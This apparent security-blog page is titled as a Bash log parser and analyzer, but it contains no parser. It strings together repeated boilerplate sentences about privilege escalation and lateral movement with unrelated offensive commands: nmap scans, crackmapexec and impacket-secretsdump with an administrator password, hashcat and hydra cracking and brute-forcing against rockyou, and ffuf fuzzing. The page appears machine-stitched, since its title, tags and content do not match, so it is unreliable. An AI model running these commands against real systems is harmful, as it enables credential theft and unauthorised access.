---
TitleSEO: "Log Parser and Analyzer in Bash | ZureFX"
TitlePost: "Log Parser and Analyzer — Bash"
Author: "ZureFX"
Description: "A Bash script for log parser and analyzer. Built for security research and automation."
Keywords: "bash, go, fuzzer, powershell, c"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-135.html"
URL_IMAGES: ""
Date: "2024-01-31"
Tags: "Bash, Go, Fuzzer, PowerShell, C"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-135"
Permalink: "/scripting/script-log-parser-and-analyzer-135.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `metasploit`
- `sqlmap`
- `psexec`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```bash
nmap -sCV -p1433,443,23 10.111.41.208 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.101.52.183 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p1433,389,25 10.33.114.73 -oN scan.txt
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.189.50 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.93.179
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.106.184/FUZZ
```

## Output

### Example Output

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 20.53s
```
